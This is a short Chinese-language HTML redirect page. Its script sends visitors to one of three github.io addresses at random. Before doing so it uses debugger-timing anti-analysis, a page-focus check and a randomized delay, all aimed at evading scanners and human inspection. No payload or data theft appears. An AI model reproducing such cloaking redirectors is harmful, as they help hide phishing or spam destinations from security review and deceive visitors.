<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>正在加载，请稍候...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { text-align: center; margin-top: 100px; font-family: sans-serif; }
  </style>
</head>
<body>
  <h2>正在验证并跳转，请稍候...</h2>
  <script>
    (function () {
      const urls = [
        "https://a78521336.github.io/1/",
        "https://a78521336.github.io/2/",
        "https://a78521336.github.io/3/"
      ];

      // 👀 反调试机制
      function antiDebug() {
        const threshold = 160;
        const start = new Date();
        debugger;
        const end = new Date();
        if (end - start > threshold) {
          document.body.innerHTML = "<h2>检测到非法调试行为，已终止跳转。</h2>";
          throw new Error("Debugger detected");
        }
      }

      // ⏱️ 模拟真实用户延迟
      const delay = Math.floor(Math.random() * 2000) + 1000; // 1~3秒

      // 👁️ 焦点检测：防模拟点击
      if (!document.hasFocus()) {
        window.addEventListener("focus", () => location.reload());
        document.body.innerHTML = "<h2>请保持页面激活，准备跳转...</h2>";
        return;
      }

      // 🧠 选择随机跳转目标
      const go = () => {
        try {
          antiDebug();
          const target = urls[Math.floor(Math.random() * urls.length)];
          location.href = target;
        } catch (e) {
          console.warn(e);
        }
      };

      setTimeout(go, delay);
    })();
  </script>
</body>
</html>
